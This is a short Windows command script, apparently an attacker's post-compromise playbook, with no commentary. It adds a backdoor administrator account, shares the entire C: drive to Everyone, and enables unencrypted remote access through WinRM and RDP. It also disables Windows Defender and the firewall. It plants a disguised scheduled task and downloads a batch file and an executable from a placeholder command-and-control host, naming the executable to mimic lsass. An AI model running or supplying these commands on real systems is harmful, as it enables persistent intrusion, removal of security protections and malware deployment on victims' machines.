net user felipe felipe /add
net localgroup Administrators felipe /add
net share MONEY$ DataShare=C:\ /grant:Everyone full /unlimited
Enable-PSRemoting -Force
schtasks /create /sc minute /mo 7 /tn  "MicrosoftXbox360Controller" /tr \\C:\$Recycle.Bin\trail.bat
winrm quickconfig
winrm set winrm/config/Client '@{AllowUnencrypted = "true"}'
winrm set winrm/config/client/auth '@{Basic="true"}'
winrm set winrm/config/service/auth '@{Basic="true"}'
winrm set winrm/config/service '@{AllowUnencrypted="true"}'
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
Set-NetFirewallProfile -All -Enabled False
New-ItemProperty -Path “HKLM:\SYSTEM\CurrentControlSet\Services\mpssvc” -Name Start -Value 4 -PropertyType DWORD -Force
Invoke-WebRequest -URI "http://C2.IP/trail.bat" -OutFile "C:\$Recycle.Bin\trail.bat"
Invoke-WebRequest -URI "http://C2.IP/HOLLOW_PHILOSOPHY.EXE" -OutFile "C:\$Recycle.Bin\1sass.exe"
